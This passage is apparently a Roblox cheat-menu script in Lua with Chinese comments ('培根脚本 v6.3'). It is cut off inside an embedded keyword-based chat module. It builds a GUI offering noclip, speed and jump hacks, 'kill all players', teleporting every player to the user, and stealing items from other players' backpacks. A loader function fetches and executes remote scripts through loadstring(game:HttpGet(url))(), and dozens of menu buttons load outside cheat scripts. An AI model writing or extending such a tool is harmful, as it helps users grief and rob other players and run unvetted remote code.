local function loadScript()
    if not game:IsLoaded() then game.Loaded:Wait() end
    
    -- 获取服务
    local Services = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"), 
        UserInputService = game:GetService("UserInputService"),
        TweenService = game:GetService("TweenService"),
        Workspace = game:GetService("Workspace"),
        CoreGui = game:GetService("CoreGui"),
        Lighting = game:GetService("Lighting"),
        SoundService = game:GetService("SoundService")
    }
    
    local Players, RunService, UserInputService, TweenService, Workspace, CoreGui, Lighting, SoundService = 
        Services.Players, Services.RunService, Services.UserInputService, Services.TweenService, 
        Services.Workspace, Services.CoreGui, Services.Lighting, Services.SoundService
    
    local LocalPlayer = Players.LocalPlayer
    if not LocalPlayer then
        Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
        LocalPlayer = Players.LocalPlayer
    end

    -- 创建UI
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "BaconScriptGUI_" .. math.random(10000,99999)
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.Parent = CoreGui
    
    -- 主窗口（改小尺寸）
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 700, 0, 450) -- 改小尺寸
    MainFrame.Position = UDim2.new(0.5, -350, 0.5, -225)
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
    MainFrame.BackgroundTransparency = 0.1
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Visible = false
    MainFrame.Parent = ScreenGui
    
    -- 添加阴影效果
    local Shadow = Instance.new("ImageLabel")
    Shadow.Size = UDim2.new(1, 20, 1, 20)
    Shadow.Position = UDim2.new(0, -10, 0, -10)
    Shadow.BackgroundTransparency = 1
    Shadow.Image = "rbxassetid://5554236805"
    Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    Shadow.ImageTransparency = 0.7
    Shadow.ScaleType = Enum.ScaleType.Slice
    Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    Shadow.Parent = MainFrame
    
    -- 增强圆角效果
    local MainCorner = Instance.new("UICorner", MainFrame)
    MainCorner.CornerRadius = UDim.new(0, 16) -- 增强圆角
    
    local MainStroke = Instance.new("UIStroke", MainFrame)
    MainStroke.Color = Color3.fromRGB(0, 150, 255)
    MainStroke.Thickness = 2
    
    -- 背景图片（保留原本UI背景）
    local BackgroundImage = Instance.new("ImageLabel")
    BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
    BackgroundImage.BackgroundTransparency = 1
    BackgroundImage.Image = "rbxassetid://89036103941643"
    BackgroundImage.ImageTransparency = 0.3
    BackgroundImage.ScaleType = Enum.ScaleType.Crop
    BackgroundImage.ZIndex = 1
    Instance.new("UICorner", BackgroundImage).CornerRadius = UDim.new(0, 16)
    BackgroundImage.Parent = MainFrame
    
    -- 标题栏
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 40) -- 稍微减小高度
    TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
    TitleBar.BackgroundTransparency = 0.2
    TitleBar.BorderSizePixel = 0
    TitleBar.ZIndex = 5
    Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 16)
    TitleBar.Parent = MainFrame
    
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(1, -100, 1, 0)
    TitleLabel.Position = UDim2.new(0, 15, 0, 0)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = "培根脚本 v6.3"
    TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    TitleLabel.TextSize = 20 -- 稍微减小字体
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.ZIndex = 6
    TitleLabel.Parent = TitleBar
    
    -- 控制按钮
    local MinimizeButton = Instance.new("TextButton")
    MinimizeButton.Size = UDim2.new(0, 30, 0, 30) -- 改小按钮
    MinimizeButton.Position = UDim2.new(1, -70, 0, 5)
    MinimizeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
    MinimizeButton.BackgroundTransparency = 0.2
    MinimizeButton.Text = "_"
    MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    MinimizeButton.TextSize = 16
    MinimizeButton.Font = Enum.Font.GothamBold
    MinimizeButton.ZIndex = 6
    Instance.new("UICorner", MinimizeButton).CornerRadius = UDim.new(0, 8)
    MinimizeButton.Parent = TitleBar

    local CloseButton = Instance.new("TextButton")
    CloseButton.Size = UDim2.new(0, 30, 0, 30) -- 改小按钮
    CloseButton.Position = UDim2.new(1, -35, 0, 5)
    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    CloseButton.BackgroundTransparency = 0.2
    CloseButton.Text = "X"
    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseButton.TextSize = 14
    CloseButton.Font = Enum.Font.GothamBold
    CloseButton.ZIndex = 6
    Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 8)
    CloseButton.Parent = TitleBar
    
    -- 选项卡区域（左侧）
    local TabFrame = Instance.new("Frame")
    TabFrame.Size = UDim2.new(0, 150, 1, -40) -- 改小宽度
    TabFrame.Position = UDim2.new(0, 0, 0, 40)
    TabFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
    TabFrame.BackgroundTransparency = 0.2
    TabFrame.ZIndex = 3
    Instance.new("UICorner", TabFrame).CornerRadius = UDim.new(0, 16)
    TabFrame.Parent = MainFrame
    
    -- 主内容区域（右侧）
    local MainContent = Instance.new("Frame")
    MainContent.Size = UDim2.new(1, -150, 1, -40)
    MainContent.Position = UDim2.new(0, 150, 0, 40)
    MainContent.BackgroundTransparency = 1
    MainContent.ZIndex = 3
    MainContent.Parent = MainFrame
    
    -- 选项卡
    local Tabs = {"基础功能", "移动功能", "玩家交互", "外观功能", "世界功能", "FE功能", "黑洞功能", "其他整合脚本"}
    local TabButtons = {}
    local CurrentTab = "基础功能"
    
    local TabLayout = Instance.new("UIListLayout", TabFrame)
    TabLayout.Padding = UDim.new(0, 5)
    Instance.new("UIPadding", TabFrame).PaddingTop = UDim.new(0, 10)
    Instance.new("UIPadding", TabFrame).PaddingLeft = UDim.new(0, 5)
    Instance.new("UIPadding", TabFrame).PaddingRight = UDim.new(0, 5)

    for i, tabName in ipairs(Tabs) do
        local tabButton = Instance.new("TextButton")
        tabButton.Size = UDim2.new(1, -10, 0, 35) -- 改小按钮
        tabButton.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
        tabButton.BackgroundTransparency = 0.3
        tabButton.Text = tabName
        tabButton.TextColor3 = Color3.fromRGB(200, 200, 255)
        tabButton.TextSize = 12 -- 减小字体
        tabButton.Font = Enum.Font.Gotham
        tabButton.ZIndex = 4
        tabButton.AutoButtonColor = false
        Instance.new("UICorner", tabButton).CornerRadius = UDim.new(0, 10) -- 增强圆角
        tabButton.Parent = TabFrame
        TabButtons[tabName] = tabButton
    end
    
    -- 内容区域（使用列表布局，单列按钮）
    local ContentScrolling = Instance.new("ScrollingFrame")
    ContentScrolling.Size = UDim2.new(1, -10, 1, -10)
    ContentScrolling.Position = UDim2.new(0, 5, 0, 5)
    ContentScrolling.BackgroundTransparency = 1
    ContentScrolling.ScrollBarThickness = 6 -- 减小滚动条
    ContentScrolling.ScrollBarImageColor3 = Color3.fromRGB(0, 150, 255)
    ContentScrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
    ContentScrolling.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ContentScrolling.ZIndex = 4
    ContentScrolling.Parent = MainContent
    
    -- 使用UIListLayout
    local ContentList = Instance.new("UIListLayout", ContentScrolling)
    ContentList.Padding = UDim.new(0, 8) -- 减小间距
    ContentList.SortOrder = Enum.SortOrder.LayoutOrder
    
    Instance.new("UIPadding", ContentScrolling).PaddingLeft = UDim.new(0, 5)
    Instance.new("UIPadding", ContentScrolling).PaddingRight = UDim.new(0, 5)
    Instance.new("UIPadding", ContentScrolling).PaddingTop = UDim.new(0, 5)
    
    -- 创建按钮函数（单列按钮）
    local function createButton(text, description)
        local buttonFrame = Instance.new("Frame")
        buttonFrame.Size = UDim2.new(1, -10, 0, 45) -- 减小高度
        buttonFrame.BackgroundTransparency = 1
        buttonFrame.LayoutOrder = #ContentScrolling:GetChildren()
        
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, 0, 1, 0)
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
        button.BackgroundTransparency = 0.3
        button.Text = text
        button.TextColor3 = Color3.fromRGB(200, 200, 255)
        button.TextSize = 12 -- 减小字体
        button.Font = Enum.Font.Gotham
        button.AutoButtonColor = false
        button.ZIndex = 5
        button.TextWrapped = true
        Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12) -- 增强圆角
        local buttonStroke = Instance.new("UIStroke", button)
        buttonStroke.Color = Color3.fromRGB(100, 100, 200)
        button.Parent = buttonFrame
        
        if description then
            button.MouseEnter:Connect(function()
                local tooltip = Instance.new("TextLabel")
                tooltip.Size = UDim2.new(0, 160, 0, 0)
                tooltip.Position = UDim2.new(0, -80, 1, 5)
                tooltip.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
                tooltip.BackgroundTransparency = 0.1
                tooltip.Text = description
                tooltip.TextColor3 = Color3.fromRGB(200, 200, 255)
                tooltip.TextSize = 11
                tooltip.TextWrapped = true
                tooltip.ZIndex = 100
                tooltip.Visible = false
                Instance.new("UICorner", tooltip).CornerRadius = UDim.new(0, 8)
                Instance.new("UIStroke", tooltip).Color = Color3.fromRGB(0, 150, 255)
                tooltip.Parent = buttonFrame
                
                tooltip.Visible = true
                TweenService:Create(tooltip, TweenInfo.new(0.2), {Size = UDim2.new(0, 160, 0, 50)}):Play()
            end)
            
            button.MouseLeave:Connect(function()
                local tooltip = buttonFrame:FindFirstChildWhichIsA("TextLabel")
                if tooltip then
                    TweenService:Create(tooltip, TweenInfo.new(0.2), {Size = UDim2.new(0, 160, 0, 0)}):Play()
                    wait(0.2)
                    tooltip:Destroy()
                end
            end)
        end
        
        button.MouseEnter:Connect(function()
            button.BackgroundTransparency = 0.1
            buttonStroke.Thickness = 2
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundTransparency = 0.3
            buttonStroke.Thickness = 1
        end)
        
        return buttonFrame, button
    end

    -- 重新组织功能分类（添加AI聊天功能）
    local FunctionTabs = {
        ["基础功能"] = {
            {name = "NoclipButton", text = "穿墙模式 [关闭]", desc = "穿透所有墙壁和物体"},
            {name = "InfiniteJumpButton", text = "无限跳跃 [关闭]", desc = "在空中也能无限跳跃"},
            {name = "SpeedButton", text = "移动速度: 16", desc = "点击切换移动速度"},
            {name = "JumpButton", text = "跳跃高度: 50", desc = "点击切换跳跃高度"},
            {name = "PlayerButton", text = "选择玩家: 无", desc = "选择目标玩家"},
            {name = "ClimbWallButton", text = "爬墙模式 [关闭]", desc = "碰到墙自动上升"},
            {name = "AntiFallButton", text = "防摔(多点几次)", desc = "防止从高处掉落受伤"},
            {name = "SuicideButton", text = "自杀", desc = "立即死亡"},
            {name = "AIChatButton", text = "简单AI聊天", desc = "启动AI智能聊天系统"}
        },
        ["移动功能"] = {
            {name = "SpinButton", text = "人物旋转 [关闭]", desc = "让人物持续旋转"},
            {name = "SpinSpeedButton", text = "旋转速度: 10", desc = "调整旋转速度"},
            {name = "AutoMoveButton", text = "自动移动 [关闭]", desc = "自动向前移动"}
        },
        ["玩家交互"] = {
            {name = "KillAllButton", text = "秒杀所有人", desc = "瞬间击败所有其他玩家"},
            {name = "TeleportAllButton", text = "传送所有人到我", desc = "把所有玩家传送到你身边"},
            {name = "SitSpinButton", text = "坐在头上旋转 [关闭]", desc = "坐在目标玩家头上旋转"},
            {name = "RideHeadButton", text = "骑在玩家头上 [关闭]", desc = "骑在目标玩家头上跟随移动"},
            {name = "ViewBackpackButton", text = "查看玩家背包", desc = "查看并偷取其他玩家的物品"},
            {name = "ClickTeleportButton", text = "点击传送", desc = "加载点击传送工具脚本"}
        },
        ["外观功能"] = {
            {name = "PlayerSizeButton", text = "玩家大小: 1", desc = "调整玩家体型大小"},
            {name = "RainbowButton", text = "彩虹模式 [关闭]", desc = "全身彩虹颜色变化"},
            {name = "GlobalRainbowButton", text = "全局彩虹 [关闭]", desc = "所有物体和建筑彩虹变色"},
            {name = "GhostButton", text = "幽灵模式 [关闭]", desc = "半透明幽灵效果"}
        },
        ["世界功能"] = {
            {name = "GravityButton", text = "重力设置: 196.2", desc = "修改游戏重力"},
            {name = "NightVisionButton", text = "夜视模式 [关闭]", desc = "开启夜视功能，黑暗环境变亮"},
            {name = "HackButton", text = "黑客入侵", desc = "客户端特效：改变贴图、天空盒、火焰效果等"},
            {name = "UIColorButton", text = "UI颜色调节", desc = "随机改变UI颜色主题"}
        },
        ["FE功能"] = {
            {name = "FEFacialButton", text = "FE表情", desc = "加载FE表情脚本"},
            {name = "FEHugButton", text = "fe拥抱", desc = "加载FE拥抱脚本"},
            {name = "FECrouchButton", text = "fe蹲下", desc = "加载FE蹲下脚本"},
            {name = "FESkyboxButton", text = "FE天空盒", desc = "加载FE天空盒脚本"},
            {name = "FESwordButton", text = "fe圣剑", desc = "加载FE圣剑脚本"},
            {name = "FECarButton", text = "FE人物变车", desc = "将人物变成汽车形态"},
            {name = "FESpiderManButton", text = "FE蜘蛛侠", desc = "加载FE蜘蛛侠脚本"},
            {name = "FER6AnimationsButton", text = "FER6动作", desc = "加载R6角色动作菜单"},
            {name = "FEHamsterBallButton", text = "FE滚蛋", desc = "加载FE仓鼠球脚本"},
            {name = "FEAutoPianoButton", text = "FE自动弹钢琴", desc = "自动弹奏钢琴"},
            {name = "FEControlNPCButton", text = "FE控制NPC", desc = "加载FE控制NPC脚本"},
            {name = "FEForsakenAnimButton", text = "FE被遗弃动作", desc = "加载FE被遗弃动作脚本"},
            {name = "FE096Button", text = "fe合集", desc = "加载FE合集脚本"},
            {name = "FEHam00dButton", text = "fe ham00d菜单", desc = "加载FE ham00d菜单脚本"},
            {name = "CatAnimButton", text = "猫动作", desc = "加载猫动作脚本"},
            {name = "InvincibleButton", text = "无敌", desc = "加载无敌脚本"},
            {name = "FEAK47Button", text = "FE AK47", desc = "加载FE AK47脚本"},
            {name = "FESniperButton", text = "FE 狙击枪", desc = "加载FE狙击枪脚本"}
        },
        ["黑洞功能"] = {
            {name = "BlackHoleV6Button", text = "黑洞v6", desc = "加载黑洞v6脚本"},
            {name = "BlackHoleV4Button", text = "黑洞v4", desc = "加载黑洞v4脚本"},
            {name = "BlackHoleV1Button", text = "黑洞v1", desc = "加载黑洞v1脚本"}
        },
        ["其他整合脚本"] = {
            {name = "FlyButton", text = "ARCEUS飞行脚本", desc = "点击加载ARCEUS X FLY V2飞行脚本"},
            {name = "InvincibleFlyButton", text = "无敌苍蝇飞行", desc = "加载无敌苍蝇飞行脚本"},
            {name = "FakeLagButton", text = "假延迟", desc = "加载假延迟脚本"},
            {name = "DayunButton", text = "大运", desc = "加载大运脚本"},
            {name = "CrawlButton", text = "在地上爬", desc = "加载在地上爬脚本"},
            {name = "FEFighterButton", text = "强行装备物品", desc = "强行装备物品脚本"},
            {name = "YeScriptButton", text = "叶脚本", desc = "加载叶脚本"},
            {name = "WalkAirButton", text = "踏空行走", desc = "加载踏空行走脚本"},
            {name = "InvisibleButton", text = "人物隐形脚本", desc = "加载人物隐形脚本"},
            {name = "FakeFriendButton", text = "假朋友", desc = "生成假朋友NPC"},
            {name = "ChatDrawButton", text = "在聊天框画画", desc = "在聊天框中绘制图案"},
            {name = "TrainEffectButton", text = "火车头效果", desc = "加载火车头效果脚本"},
            {name = "FreePrivateServerButton", text = "免费私服", desc = "加载免费私服脚本"},
            {name = "PiScriptButton", text = "皮脚本", desc = "加载皮脚本"},
            {name = "CaodanButton", text = "操蛋", desc = "加载操蛋脚本"},
            {name = "ScriptCenterButton", text = "脚本中心", desc = "加载脚本中心"},
            {name = "ShaScriptButton", text = "沙脚本", desc = "加载沙脚本"},
            {name = "StealBrainRedButton", text = "偷走脑红", desc = "加载偷走脑红脚本"},
            {name = "GardenButton", text = "种植花园", desc = "加载种植花园脚本"},
            {name = "OhioButton", text = "俄亥俄州脚本", desc = "加载俄亥俄州脚本"},
            {name = "ForsakenButton", text = "被遗弃脚本", desc = "加载被遗弃脚本"},
            {name = "ThrowFlyButton", text = "甩飞脚本", desc = "加载甩飞脚本"},
            {name = "BeatDogButton", text = "悦服循环打狗", desc = "加载悦服循环打狗脚本"},
            {name = "ChenScriptButton", text = "辰脚本", desc = "加载辰脚本"}
        }
    }

    -- 创建按钮
    local ButtonInstances = {}
    local ButtonFrames = {}
    
    for tabName, functions in pairs(FunctionTabs) do
        for _, func in ipairs(functions) do
            local buttonFrame, button = createButton(func.text, func.desc)
            buttonFrame.Parent = ContentScrolling
            buttonFrame.Visible = (tabName == "基础功能")
            ButtonInstances[func.name] = button
            ButtonFrames[func.name] = buttonFrame
        end
    end

    -- 选项卡切换
    for tabName, tabButton in pairs(TabButtons) do
        tabButton.MouseButton1Click:Connect(function()
            CurrentTab = tabName
            for name, frame in pairs(ButtonFrames) do
                frame.Visible = false
            end
            for _, func in ipairs(FunctionTabs[tabName]) do
                ButtonFrames[func.name].Visible = true
            end
            for tName, tButton in pairs(TabButtons) do
                if tName == tabName then
                    tButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
                    tButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                else
                    tButton.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
                    tButton.TextColor3 = Color3.fromRGB(200, 200, 255)
                end
            end
        end)
    end

    TabButtons["基础功能"].BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    TabButtons["基础功能"].TextColor3 = Color3.fromRGB(255, 255, 255)

    -- 功能变量
    local noclip, infiniteJump, spinning, walkAir = false, false, false, false
    local rainbow, globalRainbow, ghost, sitSpinning, ridingHead = false, false, false, false, false
    local climbing, autoMove, nightVision = false, false, false
    local walkSpeed, jumpPower, spinSpeed, playerSize, gravity, sitSpinSpeed = 16, 50, 10, 1, 196.2, 5
    local selectedPlayer = nil
    local connections = {}
    local originalTransparency, originalColors = {}
    local originalLightingSettings = {}

    -- 播放点击音效函数
    local function playClickSound()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://82845990304289"
        sound.Volume = 0.5
        sound.Parent = Workspace
        sound:Play()
        game:GetService("Debris"):AddItem(sound, 2)
    end

    -- 通知函数
    local function showNotification(message, color)
        local notification = Instance.new("Frame")
        notification.Size = UDim2.new(0, 300, 0, 60)
        notification.Position = UDim2.new(0.5, -150, 0.1, 0)
        notification.BackgroundColor3 = color
        notification.BackgroundTransparency = 0.2
        notification.ZIndex = 100
        Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 12)
        Instance.new("UIStroke", notification).Color = Color3.fromRGB(255, 255, 255)
        notification.Parent = ScreenGui
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -20, 1, -10)
        label.Position = UDim2.new(0, 10, 0, 5)
        label.BackgroundTransparency = 1
        label.Text = message
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.TextSize = 16
        label.Font = Enum.Font.GothamBold
        label.TextWrapped = true
        label.Parent = notification
        
        notification.Position = UDim2.new(0.5, -150, 0, -70)
        TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 0.1, 0)}):Play()
        
        wait(3)
        TweenService:Create(notification, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 0, -70)}):Play()
        wait(0.5)
        notification:Destroy()
    end

    -- UI控制
    local minimized = false
    local function toggleMinimize()
        playClickSound()
        minimized = not minimized
        if minimized then
            TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 180, 0, 40)}):Play()
            wait(0.3)
            TabFrame.Visible = false
            MainContent.Visible = false
            MinimizeButton.Text = "+"
        else
            TabFrame.Visible = true
            MainContent.Visible = true
            TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 700, 0, 450)}):Play()
            MinimizeButton.Text = "_"
        end
    end

    -- 选择玩家
    local function selectPlayer()
        playClickSound()
        local playerList = Players:GetPlayers()
        local currentIndex = 0
        
        if selectedPlayer then
            for i, player in ipairs(playerList) do
                if player == selectedPlayer then
                    currentIndex = i
                    break
                end
            end
        end
        
        selectedPlayer = playerList[(currentIndex % #playerList) + 1]
        ButtonInstances.PlayerButton.Text = "选择玩家: " .. selectedPlayer.Name
        showNotification("已选择玩家: " .. selectedPlayer.Name, Color3.fromRGB(0, 150, 200))
    end

    -- 脚本加载函数
    local function loadExternalScript(url, name)
        playClickSound()
        loadstring(game:HttpGet(url))()
        showNotification(name .. "已加载!", Color3.fromRGB(0, 200, 0))
    end

    -- AI聊天功能函数
    local function loadAIChat()
        playClickSound()
        showNotification("正在启动AI聊天系统...", Color3.fromRGB(0, 150, 255))
        
        -- 这里直接嵌入AI聊天脚本
        local aiChatScript = [[
            -- Roblox AI智能聊天系统 - 完整可执行版本
            local Players = game:GetService("Players")
            local TextService = game:GetService("TextService")
            local UserInputService = game:GetService("UserInputService")
            local RunService = game:GetService("RunService")
            
            -- 游戏关键词库
            local GameKeywords = {
                popularGames = {
                    "adopt me", "brookhaven", "arsenal", "jailbreak", "piggy", "murder mystery 2",
                    "royale high", "blox fruits", "tower of hell", "natural disaster survival",
                    "work at a pizza place", "meepcity", "welcome to bloxburg", "vehicle simulator",
                    "theme park tycoon 2", "sharkbite", "super doomspire", "speed run 4",
                    "phantom forces", "mad city", "mm2", "breaking point", "polybattle",
                    "survive the killer", "the mimic", "doomspire brickbattle", "weight lifting",
                    "robloxian highschool", "flee the facility", "scp 3008", "zombie attack"
                },
                gameGenres = {
                    "角色扮演", "射击游戏", "冒险游戏", "恐怖游戏", "模拟游戏", "生存游戏",
                    "解谜游戏", "竞速游戏", "策略游戏", "社交游戏", "养成游戏", "格斗游戏",
                    "体育游戏", "音乐游戏", "教育游戏", "休闲游戏", "动作游戏", "开放世界"
                },
                gameMechanics = {
                    "多人游戏", "单人游戏", "合作模式", "对战模式", "团队竞技", "自由探索",
                    "任务系统", "成就系统", "等级系统", "装备系统", "技能系统", "建造系统",
                    "交易系统", "宠物系统", "房屋系统", "车辆系统", "武器系统", "服装系统"
                },
                gameItems = {
                    "robux", "游戏币", "道具", "装备", "武器", "皮肤", "宠物", "车辆", "房屋",
                    "服装", "饰品", "通行证", "会员", "vip", "宝箱", "钥匙", "材料", "资源"
                },
                gameplayTerms = {
                    "怎么玩", "攻略", "技巧", "秘籍", "bug", "刷钱", "升级", "练级", "刷经验",
                    "快速升级", "赚钱方法", "获得装备", "解锁", "通关", "过关", "boss", "敌人",
                    "npc", "任务", "剧情", "结局", "隐藏", "彩蛋", "活动", "限时", "节日"
                },
                developmentTerms = {
                    "脚本", "lua", "编程", "代码", "开发", "制作", "建模", "动画", "音效",
                    "ui", "界面", "gui", "3d", "模型", "贴图", "材质", "光照", "物理",
                    "碰撞", "触发器", "事件", "函数", "变量", "循环", "条件", "数组", "表"
                }
            }
            
            -- 对话记忆系统
            local DialogueMemory = {
                MAX_HISTORY = 25,
                history = {},
                context = {},
                topics = {},
                userPreferences = {},
                gameMentions = {}
            }
            
            function DialogueMemory:AddMessage(role, content)
                table.insert(self.history, {
                    role = role,
                    content = content,
                    timestamp = os.time(),
                    length = #content
                })
                
                if #self.history > self.MAX_HISTORY then
                    table.remove(self.history, 1)
                end
                
                if role == "user" then
                    self:AnalyzeMessage(content)
                end
            end
            
            function DialogueMemory:AnalyzeMessage(message)
                local lowerMsg = string.lower(message)
                
                local entities = self:ExtractGameEntities(message)
                for _, entity in ipairs(entities) do
                    if not table.find(self.context, entity) then
                        table.insert(self.context, entity)
                    end
                end
                
                local mentionedGames = self:ExtractMentionedGames(message)
                for _, game in ipairs(mentionedGames) do
                    if not table.find(self.gameMentions, game) then
                        table.insert(self.gameMentions, game)
                    end
                end
                
                local topic = self:IdentifyTopic(message)
                if topic and not table.find(self.topics, topic) then
                    table.insert(self.topics, topic)
                end
                
                local emotion = self:DetectEmotion(message)
                if emotion then
                    self.userPreferences.lastEmotion = emotion
                end
                
                if #self.context > 20 then
                    table.remove(self.context, 1)
                end
                if #self.topics > 10 then
                    table.remove(self.topics, 1)
                end
                if #self.gameMentions > 15 then
                    table.remove(self.gameMentions, 1)
                end
            end
            
            function DialogueMemory:ExtractGameEntities(message)
                local entities = {}
                local lowerMsg = string.lower(message)
                
                for _, game in ipairs(GameKeywords.popularGames) do
                    if string.find(lowerMsg, game) then
                        table.insert(entities, "game:" .. game)
                    end
                end
                
                for _, genre in ipairs(GameKeywords.gameGenres) do
                    if string.find(message, genre) then
                        table.insert(entities, "genre:" .. genre)
                    end
                end
                
                for _, mechanic in ipairs(GameKeywords.gameMechanics) do
                    if string.find(message, mechanic) then
                        table.insert(entities, "mechanic:" .. mechanic)
                    end
                end
                
                for _, item in ipairs(GameKeywords.gameItems) do
                    if string.find(lowerMsg, item) then
                        table.insert(entities, "item:" .. item)
                    end
                end
                
                for _, term in ipairs(GameKeywords.developmentTerms) do
                    if string.find(lowerMsg, term) then
                        table.insert(entities, "dev:" .. term)
                    end
                end
                
                return entities
            end
            
            function DialogueMemory:ExtractMentionedGames(message)
                local games = {}
                local lowerMsg = string.lower(message)
                
                for _, game in ipairs(GameKeywords.popularGames) do
                    if string.find(lowerMsg, game) then
                        table.insert(games, game)
                    end
                end
                
                return games
            end
            
            function DialogueMemory:IdentifyTopic(message)
                local lowerMsg = string.lower(message)
                
                local topicKeywords = {
                    ["游戏推荐"] = {"推荐游戏", "有什么好玩的", "游戏推荐", "玩什么", "哪个游戏好玩"},
                    ["游戏攻略"] = {"攻略", "怎么玩", "技巧", "秘籍", "过关", "通关", "怎么过关"},
                    ["游戏开发"] = {"开发", "制作", "脚本", "lua", "编程", "建模", "代码"},
                    ["游戏交易"] = {"交易", "买卖", "价格", "价值", "值钱", "值多少", "多少钱"},
                    ["游戏社交"] = {"朋友", "组队", "一起玩", "交友", "聊天", "公会", "社团"},
                    ["游戏问题"] = {"bug", "错误", "问题", "卡住了", "进不去", "闪退", "崩溃"},
                    ["游戏更新"] = {"更新", "新内容", "新版本", "赛季", "活动", "限时"},
                    ["游戏比较"] = {"哪个好", "比较好", "对比", "区别", "不同", "差异"}
                }
                
                for topic, keywords in pairs(topicKeywords) do
                    for _, keyword in ipairs(keywords) do
                        if string.find(lowerMsg, keyword) then
                            return topic
                        end
                    end
                end
                
                return nil
            end
            
            function DialogueMemory:DetectEmotion(message)
                local lowerMsg = string.lower(message)
                
                local emotionWords = {
                    ["开心"] = {
                        "开心", "高兴", "快乐", "喜欢", "爱", "棒", "好", "不错", "awesome", 
                        "great", "love", "完美", "厉害", "牛逼", "太棒了", "太好了", "爽"
                    },
                    ["沮丧"] = {
                        "沮丧", "难过", "伤心", "生气", "愤怒", "讨厌", "糟糕", "bad", "sad", 
                        "angry", "hate", "垃圾", "废物", "傻逼", "坑爹", "坑人", "被骗"
                    },
                    ["疑惑"] = {
                        "疑惑", "困惑", "不懂", "不明白", "为什么", "怎么", "如何", "what", 
                        "how", "why", "怎么回事", "怎么办", "怎么弄", "怎么搞", "咋办"
                    },
                    ["兴奋"] = {
                        "兴奋", "激动", "期待", "迫不及待", "excited", "wow", "cool", "期待",
                        "想玩", "想试试", "很想", "超想", "超级想", "特别想", "非常想"
                    },
                    ["求助"] = {
                        "求助", "帮助", "救命", "帮忙", "求教", "请教", "请问", "大佬", 
                        "大神", "高手", "求带", "带带我", "教教我", "告诉我", "问一下"
                    }
                }
                
                for emotion, words in pairs(emotionWords) do
                    for _, word in ipairs(words) do
                        if string.find(lowerMsg, word) then
                            return emotion
                        end
                    end
                end
                
                return "中性"
            end
            
            function DialogueMemory:GetRecentTopics(count)
                count = math.min(count or 3, #self.topics)
                local recent = {}
                for i = math.max(1, #self.topics - count + 1), #self.topics do
                    table.insert(recent, self.topics[i])
                end
                return recent
            end
            
            function DialogueMemory:GetRecentGames(count)
                count = math.min(count or 3, #self.gameMentions)
                local recent = {}
                for i = math.max(1, #self.gameMentions - count + 1), #self.gameMentions do
                    table.insert(recent, self.gameMentions[i])
                end
                return recent
            end
            
            function DialogueMemory:Clear()
                self.history = {}
                self.context = {}
                self.topics = {}
                self.userPreferences = {}
                self.gameMentions = {}
            end
            
            -- 语义理解引擎
            local SemanticEngine = {
                gameKnowledge = {
                    ["adopt me"] = {
                        title = "Adopt Me!",
                        genre = "角色扮演/宠物养成",
                        description = "在Adopt Me中，你可以领养宠物、装饰房屋、与其他玩家互动。这是Roblox上最受欢迎的游戏之一。",
                        features = {
                            "领养各种宠物，包括稀有和传奇宠物",
                            "装饰和定制你的房屋",
                            "与其他玩家交易宠物和物品",
                            "完成日常任务获得奖励",
                            "参加季节性活动获取限定物品"
                        },
                        tips = {
                            "通过完成任务和交易可以获得稀有宠物。",
                            "不同的宠物有不同的价值和稀有度。",
                            "可以建造和装饰自己的房屋。",
                            "参加活动可以获得限定版宠物。",
                            "与其他玩家交易时要注意市场价值。"
                        },
                        popularItems = {"飞龙", "独角兽", "蝙蝠龙", "阴影龙", "霜龙"}
                    },
                    ["brookhaven"] = {
                        title = "Brookhaven",
                        genre = "社交角色扮演",
                        description = "在一个虚拟城镇中生活、工作和社交。玩家可以扮演各种角色，拥有房屋和车辆。",
                        features = {
                            "拥有自己的房屋和车辆",
                            "扮演警察、医生、消防员等职业",
                            "各种社交场所如商店、餐厅、公园",
                            "与其他玩家互动和交友",
                            "定期更新新内容和物品"
                        },
                        tips = {
                            "可以扮演不同职业的角色。",
